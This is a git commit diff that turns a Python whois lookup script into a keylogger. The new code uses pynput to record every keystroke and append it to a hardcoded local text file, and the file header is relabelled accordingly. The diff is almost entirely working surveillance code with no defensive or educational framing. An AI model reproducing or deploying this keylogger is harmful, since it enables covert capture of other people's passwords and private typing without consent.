7d3c1c255d3147120f9a9e6e13da934b1bdee463
Charles Dantas <72893967+charlesdev771@users.noreply.github.com>
2022-07-03 01:40:56 -0300

    Update script.py

--- script.py
+++ script.py
@@ -1,29 +1,33 @@
+
 ##====================================================================##
 ##                                                                    ##
-## SOFTWARE: Whois python.                                            ##
+## SOFTWARE: Keylogger python.                                        ##
 ## AUTHOR: Charles Dantas (chameleon)                                 ##
 ## VERSION: 1.0                                                       ##
-## CREATION DATE: 29/06/2022                                          ##
+## CREATION DATE: 03/07/2022                                          ##
 ##                                                                    ##
 ##====================================================================##
 
-#Important! Download pip install python-whois
+#Important: pip3 install pynput
+from pynput.keyboard import Listener
+import re
+import os
 
-import sys
-import whois
+file = "/home/chameleon/Desktop/Logger.txt"
 
-def __init__():
 
-	try:
 
-		domain = input("Domain: ")
-		consult = whois.whois(domain)
-		print(consult.email)
-		print(consult.text)
+def cap(key):
+    key = str(key)
+    key = re.sub(r'\'', '', key)
+    key = re.sub(r'Key.space', ' ', key)
+    key = re.sub(r'Key.tab', ' ', key)
+    key = re.sub(r'Key.ctrlc', ' ', key)
+    key  = re.sub(r'Key.enter', ' \n ', key)
+    key = re.sub(r'key.*', ' ', key)
+    with open(file, 'a') as  log:
+        log.write(key)
 
-	except Exception as error:
 
-		print(f'Error:{error}') 
-
-__init__()
-
+with Listener(on_press=cap) as logOnPress:
+    logOnPress.join()
